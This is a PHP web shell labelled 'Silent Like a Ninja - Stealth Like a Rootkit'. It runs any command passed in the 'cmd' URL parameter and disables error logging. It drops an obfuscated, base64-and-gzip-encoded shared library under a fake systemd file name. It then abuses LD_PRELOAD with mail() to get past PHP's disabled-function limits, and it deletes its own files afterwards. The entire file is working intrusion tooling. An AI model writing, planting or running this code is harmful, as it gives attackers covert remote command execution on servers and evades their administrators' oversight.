<?php
error_reporting(0);
@ini_set('display_errors','0');
@ini_set('html_errors','0');
@ini_set('log_errors','0');
@clearstatcache();

if(isset($_GET['cmd']) && !empty($_GET['cmd'])){
    $command = $_GET['cmd'];
    $opt = "./systemd-private-58d91780dc1a4a2989da09b1854e1dc2-ninja.service";
    $fso = "./systemd-private-58d91780dc1a4a2989da09b1854e1dc2-loader.so";
    putenv("ROOTKITNINJA_TERMINAL=".escapeshellcmd($command).">".escapeshellarg($opt)." 2>&1");
    $so = "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";
    $so = gzinflate(base64_decode($so));
    $so = file_put_contents($fso, $so);
    putenv("LD_PRELOAD=". $fso);
    mail("", "", "", "");
    echo file_get_contents($opt);
    unlink($opt);
    unlink($fso);
} else {
    echo "Silent Like a Ninja - Stealth Like a Rootkit";
}
?>
